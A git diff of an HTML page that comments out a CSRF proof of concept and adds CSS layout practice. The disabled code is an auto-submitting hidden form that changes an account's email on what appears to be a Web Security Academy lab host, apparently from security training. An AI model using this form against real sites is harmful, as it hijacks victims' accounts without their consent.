@@ -4,13 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <style>
+        .div1 {
+            background-color: pink;
+            height: 500px;
+            display: flex;
+            justify-content: center;
+        }
+        .div2 
+        {
+            margin: 12px;
+            background-color: green;
+            width: 160px;
+            height: 200px;
+        }
+        .none {
+            /* display: none; */
+            visibility: hidden;
+        }
+    </style>
 </head>
 <body>
-    <form action="https://0a7f00ed032da08580297635009a00f7.web-security-academy.net/my-account/change-email" method="post">
+    <!-- <form action="https://0a7f00ed032da08580297635009a00f7.web-security-academy.net/my-account/change-email" method="post">
         <input type="hidden" name="email" value="abcd@abcd.com"/>
     </form>
     <script>
         document.forms[0].submit();
-    </script>
+    </script> -->
+    <div class="div1">
+        
+    <div class="div2">1</div>
+    <div class="div2">2</div>
+    <div class="div2 none">3</div>
+    </div>
 </body>
 </html>
